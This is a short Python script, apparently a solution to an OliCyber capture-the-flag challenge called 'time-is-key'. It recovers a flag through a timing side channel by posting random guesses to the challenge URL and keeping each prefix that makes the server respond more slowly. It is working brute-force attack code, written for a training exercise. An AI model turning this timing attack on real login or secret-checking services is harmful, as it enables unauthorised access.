import requests,time
import random
import string

def genera_stringa(len):
    caratteri = string.ascii_letters + string.digits
    lunghezza = len
    return ''.join(random.choice(caratteri) for _ in range(lunghezza))



url = 'http://time-is-key.challs.olicyber.it/index.php'
i=1
parte_fissa=''
while (i<7):
	stringa_generata = genera_stringa(7-i)
	stringa_generata=parte_fissa+stringa_generata
	myobj = {'flag': stringa_generata}
	time1=time.time()
	x = requests.post(url, data = myobj)
	time2=time.time()
	print(stringa_generata)
	#print(x.text)
	
	delta=time2-time1
	print(delta)
	print(6-i)
	if delta>i:
		
		parte_fissa=stringa_generata[0:i]
		i=i+1


	if (i==7):
		print(stringa_generata)
	



	